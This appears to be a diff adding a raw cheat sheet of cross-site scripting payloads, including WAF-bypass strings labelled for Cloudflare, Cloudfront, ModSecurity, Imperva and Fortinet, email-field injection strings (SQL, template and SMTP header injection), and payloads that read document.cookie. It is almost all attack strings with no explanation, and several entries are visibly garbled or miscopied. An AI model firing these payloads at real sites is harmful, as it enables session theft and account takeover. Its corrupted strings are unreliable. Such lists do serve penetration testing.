@@ -1,0 +1,117 @@
+Xss payloads
+
+
+"()&%<><ScRipt >alert(document.domain)</ScRiPt>
+
+%0d%0%0d%0<script>alert(document.domain) </script>
+
+1'"();<test><ScRiPt>window.alert("XSS_WAF_BYPASS")</ScRiPt>
+
+1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=
+
+&3Chtml&3E&0A&3Cbody&3E%0A&3Cscript&3Ealert(1)&3C&2Fscript%3E%0A&3C&2Fbdy%3E%0A%3C%2Fhtml%3E
+
+%3CSVGoNIY=1%200NIOAD=confirm(document.domain)%3E
+
+< object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTLUNsb3VkZmxhcmUtQnlwYXNzLUJ5LUVMSVpFVU9QQUIOJyk8L3Njcm|wdD4=">
+
+Parameter: invitedby=
+Payload=%22%3Е%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+
+Paylodays for gmail parameter:-
+
+test+(‹ script›alert(0)</script›)@example.com test@example(<script›alert(0)</script›).com
+"‹script› alert (0)</script>"@example.com
+"<%=7*7%>"@example.com
+test+(${(7*7}})@example.com
+"'OR1=1-- '"@example.com user@test .burpcollaborator.netuser@[127.0.0.1]
+user@email=attacker@example.com%0d%0aContent-Length%200%0d%0a%0d%0a"@example.com
+"recipient@test.com\r\nRCPTTO:<victim+"@test.com
+
+
+
+''><svg><animate onbegin=alert('hacked')
+attributeName=x></svg>
+<a href=javascript:alert('hacked')>Click Here<la>
+<IFRAME SRC="javascript:alert('hacked');"></IFRAME>
+<div ng-app> <strong class="ng-init:constructor.constructor('alert('hacked')')(">aaa</strong> </div>
+<<TexTArEa/*%00//%00*/a="not"/*%00/|/AutOFocUs||||onFoCUS=alert 'hacked* //
+
+<img src=data: onerror=alert&puncsp; (1)>
+<img src=data: onerror=alert&hairsp; (1)>
+<img src=data: onerror=alert&emsp; (1)>
+<img src=data: onerror=alert&emsp13; (1)>
+
+<img src=x onerror='const createPromise = newPromise((resolve, reject) => resolve(cookieStore.get("<cookie name>"))); createPromise.then((promisedata) => {confirm (promisedata.value)}) '>
+
+
+XSS WAF Bypass payloads
+CloudFlare WAF: <svg onload =alert&#0000000040document.cookie)>
+<svg/oNLY%3d1/**/ On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ=="))>
+
+Cloudfront WAF: <details/open/ontoggle=confirm ('XSS')>
+6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/ ;window/*aabb*/['al'%2b' ert'] (document./*aabb*/Location);">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror javascript:alert(cloudfrontbypass)//>
+
+Mod security: <svg onload='new Function*["Y000!"].find (al\u0065rt)**>
+
+Imperva WAF:
+‹detailsx=xxxXxXXXXXXXXXXXXXXXXXXXXXOpen ontoggle=k&#x0000000000061; alert&#x000000028;0rigin&#x000029;>
+
+
+Tips:- [ 9 dangerous XSS payloads within just 30 characters ]
+"> <script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><video sic onerror=alert(1)>
+"><audio sc onerror=alert (1) >
+"><svg/onload=alert (1)>
+"><body/onload=alert (1) >
+"><input/onfocus=alert (1)>
+"> <div onpointerover=alert(1)>
+"><b onmouseover=alert(1)>hover
+
+
+<Img Src=OnXSS OnError=confirm ("OMNI") >
+
+<img/src/onerror=alert&#xFEFF;(1)>
+
+61%22)%26%25%22%3%3Csvg/onload=prompt(document.domain)%3E/
+
+<button%20popovertarget=x>Click%20me</ button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
+
+"><a nope="%26quot;x%26quot; "onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get (document, 'coo'+'kie'))">
+
+
+
+ddd");</script><script>alert("XSS By Az3m");</script><script>aaa("
+
+"∞5"><body%2fonload%3d%26lt%3b!--%26gt%3b%26%2310confirm(1)%3bprompt(%2fXSS%2f.source)>"%2c
+
+
+"><img/src=%20only=1%200nErRor==alert*XSS'><!--
+
+<%2FsCrIpT><ScRiPt>alert(document.cookie)<%2FsCrIpT>
+
+
+xss'"><iframe srcdoc=*%26lt;script>;prompt'${document.domain}*%26lt;/script>'>
+
+ 
+:password.php?nid=tester""><sVg%2Fonload%3Dprompt(document.cookie) >
+
+script>%5CxE1%5Cx9A%5Cx80javascript%3Aalert%28document.cookie%29<%2Fscript>
+
+#Working #Payloads :
+sm"*alert(1)*
+"*alert(1)*
+%22-alert ('XSS')-%22
+<svg/onload=alert(1)>
+
+
+
+Fortinet gateway payloads xss
+
+<dETAILS%0aopen%0aonToGgle%0%3d%0%3dprompt, a(origin)%20х>
+<details%20open%20ontoggle="a%3Dalert;%20a(%27XSS%20Payload%20Triggered%27):">
+<details open ontoggle="a%3Dalert; a ('subhashis360');">
+<details open ontoggle=" (newFunction(atob('YWxIcnQoJ1hTUyBQYXIsb2FkIFRyaWdnZXJIZCcp'D)()">
